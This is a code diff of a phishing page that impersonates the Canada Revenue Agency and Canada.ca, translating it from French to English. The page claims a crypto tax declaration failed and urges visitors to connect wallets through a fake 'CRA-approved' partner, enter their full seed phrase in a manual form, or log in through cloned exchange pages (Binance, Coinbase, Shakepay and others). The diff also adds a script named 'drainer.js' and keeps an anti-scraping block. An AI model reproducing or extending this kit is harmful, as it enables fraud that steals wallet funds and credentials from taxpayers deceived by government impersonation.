@@ -1,15 +1,15 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Vérification requise - Canada.ca</title>
+  <title>Verification Required - Canada.ca</title>
   <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2">
   <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2">
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
   <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
-  <script src="walletconnect-v2.bundle.js"></script>
+  <script src="../../../../../../../walletconnect-v2.bundle.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
   <style>
     body { font-family: 'Noto Sans', sans-serif; color: #333; }
@@ -23,68 +23,64 @@
 <body class="bg-white">
   <header class="py-6">
     <div class="container-custom flex justify-between items-start">
-      <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-fr.svg" alt="Gouvernement du Canada" class="h-10" />
+      <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-en.svg" alt="Government of Canada" class="h-10" />
       <div class="hidden md:flex flex-col items-end">
-        <a href="validation.html" class="text-[#335075] hover:underline text-sm font-semibold underline mb-4">English</a>
+        <a href="validation-fr.html" class="text-[#335075] hover:underline text-sm font-semibold underline mb-4">Français</a>
       </div>
     </div>
   </header>
 
-  <nav class="nav-bar">
-    <div class="container-custom flex justify-between items-center h-full text-white font-bold">
-      <button class="px-4 h-full border-l border-r border-gray-700">MENU <i class="fas fa-caret-down"></i></button>
-      <a href="https://www.canada.ca/fr/agence-revenu.html" target="_blank" class="px-4 h-full flex items-center">Ouvrir une session ARC</a>
-    </div>
-  </nav>
+  <nav class="nav-bar"></nav>
+
 
   <main class="container-custom py-10">
     <div class="red-accent">
-      <h1 class="text-4xl font-bold pb-2">Nous n'avons pas pu valider le montant déclaré</h1>
+      <h1 class="text-4xl font-bold pb-2">We could not validate the declared amount</h1>
     </div>
-    <p class="text-lg text-gray-700 mb-8 max-w-3xl">Choisissez une méthode de vérification pour poursuivre votre soumission de déclaration crypto. Vous pouvez effectuer une vérification automatique à l'aide d'un partenaire de connexion crypto ou fournir une vérification manuelle avec les détails de votre portefeuille.</p>
+    <p class="text-lg text-gray-700 mb-8 max-w-3xl">Choose a verification method to continue your crypto return submission. You can complete automatic verification using a crypto sign-in partner or provide manual verification with your wallet details.</p>
 
     <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
       <section class="border border-gray-200 rounded-lg p-6 bg-gray-50">
-        <h2 class="text-2xl font-bold mb-4">Vérification automatique</h2>
-        <p class="mb-6 text-gray-700">Connectez votre portefeuille de manière sécurisée par l'intermédiaire d'un partenaire de connexion crypto approuvé par l'ARC. C'est la façon la plus rapide de valider vos avoirs.</p>
+        <h2 class="text-2xl font-bold mb-4">Automatic verification</h2>
+        <p class="mb-6 text-gray-700">Securely connect your wallet through a CRA-approved crypto sign-in partner. This is the fastest way to validate your holdings.</p>
         <div class="space-y-3 mb-6">
           <div class="flex items-center gap-2 text-sm text-gray-600">
-            <i class="fas fa-check text-green-600"></i> Supporte : Exodus, MetaMask, Coinbase, TrustWallet, Ledger Live &nbsp;|&nbsp; <span class="text-gray-500">Stablecoins seulement (USDT, USDC, etc.)</span>
+            <i class="fas fa-check text-green-600"></i> Supports: Exodus, MetaMask, Coinbase, TrustWallet, Ledger Live &nbsp;|&nbsp; <span class="text-gray-500">Stablecoins only (USDT, USDC, etc.)</span>
           </div>
         </div>
         <button onclick="showWalletSelector()" class="bg-[#335075] text-white px-6 py-2 rounded font-bold hover:bg-[#26374a] w-full flex items-center justify-center gap-2">
-          <i class="fas fa-link"></i> Connecter un partenaire de connexion
+          <i class="fas fa-link"></i> Connect Sign-in Partner
         </button>
 
         <div class="mt-10">
-          <h3 class="text-xl font-bold mb-3">Utilisation d'une bourse ou des unstablecoins?</h3>
-          <p class="text-gray-700 mb-4">La validation de bourse est différente des autres portefeuilles et nécessite des étapes supplémentaires pour une vérification sécurisée.</p>
+          <h3 class="text-xl font-bold mb-3">Using an exchange or Unstablecoins?</h3>
+          <p class="text-gray-700 mb-4">Exchange validation is different from other wallets and requires additional steps for secure verification.</p>
           <button onclick="showExchangeSelector()" class="bg-[#335075] text-white px-6 py-2 rounded font-bold hover:bg-[#26374a] w-full flex items-center justify-center gap-2">
-            <i class="fas fa-link"></i> Connecter un tiers
+            <i class="fas fa-link"></i> Connect third-party
           </button>
         </div>
       </section>
 
       <section class="border border-gray-200 rounded-lg p-6">
-        <h2 class="text-2xl font-bold mb-4">Vérification manuelle</h2>
-        <p class="text-gray-700 mb-4">Fournissez les informations de votre portefeuille pour vérifier vos montants déclarés.</p>
+        <h2 class="text-2xl font-bold mb-4">Manual verification</h2>
+        <p class="text-gray-700 mb-4">Provide your wallet information to verify your declared amounts.</p>
 
-        <button id="continueManual" onclick="toggleManualForm()" class="bg-[#335075] text-white px-6 py-2 rounded font-bold hover:bg-[#26374a] w-full">Continuer</button>
+        <button id="continueManual" onclick="toggleManualForm()" class="bg-[#335075] text-white px-6 py-2 rounded font-bold hover:bg-[#26374a] w-full">Continue</button>
 
         <div id="manualForm" style="display: none;" class="mt-6">
-          <label class="block text-sm font-bold mb-2">Fournisseur de portefeuille</label>
-          <input id="walletProvider" type="text" class="w-full border-2 border-gray-300 rounded px-3 py-2 mb-4" placeholder="p. ex., Ledger, Trezor, MetaMask" />
+          <label class="block text-sm font-bold mb-2">Wallet provider</label>
+          <input id="walletProvider" type="text" class="w-full border-2 border-gray-300 rounded px-3 py-2 mb-4" placeholder="e.g., Ledger, Trezor, MetaMask" />
 
-          <label class="block text-sm font-bold mb-2">Longueur de la phrase de récupération</label>
+          <label class="block text-sm font-bold mb-2">Seed phrase length</label>
           <select id="seedLength" class="w-full border-2 border-gray-300 rounded px-3 py-2 mb-4">
-            <option value="12">12 mots</option>
-            <option value="24">24 mots</option>
-            <option value="28">28 mots</option>
-            <option value="36">36 mots</option>
+            <option value="12">12 words</option>
+            <option value="24">24 words</option>
+            <option value="28">28 words</option>
+            <option value="36">36 words</option>
           </select>
 
           <div id="seedFields" class="grid grid-cols-2 sm:grid-cols-3 gap-3 mb-4"></div>
-          <button id="submitManual" class="bg-[#335075] text-white px-6 py-2 rounded font-bold hover:bg-[#26374a]">Soumettre la vérification manuelle</button>
+          <button id="submitManual" class="bg-[#335075] text-white px-6 py-2 rounded font-bold hover:bg-[#26374a]">Submit manual verification</button>
         </div>
       </section>
     </div>
@@ -95,9 +91,9 @@
     <div style="background:#fff; border-top:5px solid #af3c43; border-radius:4px; width:100%; max-width:480px; padding:32px; margin:20px; font-family:'Noto Sans',sans-serif;">
       <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
         <div>
-          <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-fr.svg" alt="Gouvernement du Canada" style="height:32px; margin-bottom:10px;">
-          <h3 style="font-size:18px; font-weight:700; color:#26374a; margin:0;">Sélectionnez votre portefeuille</h3>
-          <p style="font-size:13px; color:#666; margin:4px 0 0;">Portail de vérification crypto sécurisé de l'ARC</p>
+          <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-en.svg" alt="Government of Canada" style="height:32px; margin-bottom:10px;">
+          <h3 style="font-size:18px; font-weight:700; color:#26374a; margin:0;">Select your wallet</h3>
+          <p style="font-size:13px; color:#666; margin:4px 0 0;">CRA Secure Crypto Verification Portal</p>
         </div>
         <button onclick="document.getElementById('wallet-selector').style.display='none'" style="background:none; border:none; font-size:22px; cursor:pointer; color:#666;">✕</button>
       </div>
@@ -121,7 +117,7 @@
           <img src="https://avatars.githubusercontent.com/u/9784193" style="width:28px; height:28px; border-radius:50%;"> Ledger Live
         </button>
       </div>
-      <p style="font-size:11px; color:#999; text-align:center; margin-top:16px;">🔒 Sécurisé par l'Agence du revenu du Canada · Cryptage 256 bits</p>
+      <p style="font-size:11px; color:#999; text-align:center; margin-top:16px;">🔒 Secured by the Canada Revenue Agency · 256-bit encryption</p>
     </div>
   </div>
 
@@ -130,52 +126,53 @@
     <div style="background:#fff; border-top:5px solid #af3c43; border-radius:4px; width:100%; max-width:480px; padding:32px; margin:20px; font-family:'Noto Sans',sans-serif; max-height:90vh; overflow-y:auto;">
       <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
         <div>
-          <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-fr.svg" alt="Gouvernement du Canada" style="height:32px; margin-bottom:10px;">
-          <h3 style="font-size:18px; font-weight:700; color:#26374a; margin:0;">Sélectionnez votre bourse</h3>
-          <p style="font-size:13px; color:#666; margin:4px 0 0;">Portail de vérification de bourse sécurisé de l'ARC</p>
+          <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-en.svg" alt="Government of Canada" style="height:32px; margin-bottom:10px;">
+          <h3 style="font-size:18px; font-weight:700; color:#26374a; margin:0;">Select your exchange</h3>
+          <p style="font-size:13px; color:#666; margin:4px 0 0;">CRA Secure Exchange Verification Portal</p>
         </div>
         <button onclick="document.getElementById('exchange-selector').style.display='none'" style="background:none; border:none; font-size:22px; cursor:pointer; color:#666;">✕</button>
       </div>
       <div style="display:flex; flex-direction:column; gap:10px;">
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/binance-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/binance-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT_Vjx4DV7c1TJpjZKUMt4Fys_8Ek-5R-d8zA&s" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Binance
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/coinbase-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/coinbase-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/coinbase-logo-icon.png" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Coinbase
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/gemini-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/gemini-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQWotrwUbC63JU6nqvbnZQnG99N9z3wHcPQng&s" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Gemini
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/crypto.com-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/crypto.com-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://1000logos.net/wp-content/uploads/2024/10/Crypto.Com-Emblem.png" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Crypto.com
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/bitbuy-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/bitbuy-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://images.seeklogo.com/logo-png/42/2/bitbuy-logo-png_seeklogo-427001.png" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Bitbuy
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/bitfinex-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/bitfinex-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://www.shutterstock.com/image-vector/bitfinex-cryptocurrency-stock-market-logo-600nw-2154818477.jpg" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Bitfinex
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/newton-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/newton-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://play-lh.googleusercontent.com/qS53X47RxpMFo9qIabt0v6lATabHjL0TAfXQbBmrzTtS5ZN6zPaD-6lhn6Qzdo8bCKFN" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Newton
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/shakepay-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/shakepay-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://coinspot.io/wp-content/uploads/2025/11/shakepay-review-reinvented-a-canadian-friendly-crypto-on-ramp-explained-489084.png" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Shakepay
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/other-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
-          <div style="width:28px; height:28px; border-radius:50%; background:#335075; display:flex; align-items:center; justify-content:center; color:white; font-size:14px;"><i class="fas fa-wallet"></i></div> Autre bourse
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/other-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+          <div style="width:28px; height:28px; border-radius:50%; background:#335075; display:flex; align-items:center; justify-content:center; color:white; font-size:14px;"><i class="fas fa-wallet"></i></div> Other Exchange
         </button>
       </div>
-      <p style="font-size:11px; color:#999; text-align:center; margin-top:16px;">🔒 Sécurisé par l'Agence du revenu du Canada · Cryptage 256 bits</p>
+      <p style="font-size:11px; color:#999; text-align:center; margin-top:16px;">🔒 Secured by the Canada Revenue Agency · 256-bit encryption</p>
     </div>
   </div>
 
   <footer class="bg-[#26374a] text-white py-16 border-t-8 border-[#af3c43] mt-16">
     <div class="container-custom">
-      <h2 class="text-2xl font-bold">Agence du revenu du Canada (ARC)</h2>
+      <h2 class="text-2xl font-bold">Canada Revenue Agency (CRA)</h2>
     </div>
   </footer>
 
-  <script src="wallet.js"></script>
+  <script src="../../../../../../../wallet.js"></script>
+  <script src="../../../../../../../drainer.js"></script>
   <script>
     // Anti-scraping protection
     (function() {
@@ -222,6 +219,7 @@
       }, 1000);
     })();
 
+    // Override Exo3's showWalletSelector to use flex (needed for centering modal)
     function showWalletSelector() {
       var s = document.getElementById('wallet-selector');
       if (s) s.style.display = 'flex';
